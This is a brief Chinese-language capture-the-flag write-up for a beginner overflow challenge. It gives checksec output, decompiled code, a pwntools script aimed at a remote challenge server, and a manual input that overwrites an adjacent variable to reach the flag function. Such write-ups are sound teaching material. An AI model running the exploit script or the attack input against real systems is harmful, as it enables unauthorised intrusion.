checksec

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

no canary可以用shellcode

拖入ida， main 中关键代码


```asm
.bss:0000000000601068 unk_601068      db    ? ;               ; DATA XREF: main+3B↑o
.bss:0000000000601069                 db    ? ;
.bss:000000000060106A                 db    ? ;
.bss:000000000060106B                 db    ? ;
.bss:000000000060106C dword_60106C    dd ?    
```


```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  alarm(0x3Cu);
  setbuf(stdout, 0LL);
  puts("~~ welcome to ctf ~~     ");
  puts("lets get helloworld for bof");
  read(0, &unk_601068, 0x10uLL);
  if ( dword_60106C == 0x6E756161 ) // dword_60106C覆盖为0x6E756161即可
    sub_400686();
  return 0LL;
}
```

## 方法1
```python
from pwn import *
io = remote('124.126.19.106',36887)

io.recvuntil("for bof")
io.sendline(flat('a'*4, p64(0x6E756161)))
io.interactive()
io.close()
```
## 方法2
0x6E756161 = 'nuaa' 小端存储在内存， 正常为 aaun

覆盖值为 aaaa + 'aaun' = 'aaaaaaun'

nc 124.126.19.106 36887

输入 aaaaaaun 即得flag
